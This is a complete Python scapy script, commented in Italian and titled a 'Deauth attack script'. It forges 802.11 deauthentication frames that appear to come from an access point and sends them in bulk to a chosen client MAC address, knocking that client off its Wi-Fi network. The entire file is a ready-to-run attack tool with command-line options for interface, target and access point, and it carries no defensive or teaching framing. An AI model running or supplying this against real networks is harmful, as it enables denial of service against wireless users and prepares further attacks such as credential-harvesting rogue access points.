from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import time

def send_deauth(iface, target_mac, ap_mac, count=100, interval=0.1):
    """
    Invia pacchetti deauthentication per disconnettere il client dalla rete.
    """
    pkt = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    print(f"[+] Inviando {count} pacchetti deauth da {ap_mac} a {target_mac} tramite {iface}")
    sendp(pkt, iface=iface, count=count, inter=interval, verbose=1)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Deauth attack script")
    parser.add_argument("-i", "--iface", required=True, help="Interfaccia in modalità monitor (es: wlan0mon)")
    parser.add_argument("-t", "--target", required=True, help="MAC client target")
    parser.add_argument("-a", "--ap", required=True, help="MAC AP")
    args = parser.parse_args()

    send_deauth(args.iface, args.target, args.ap)
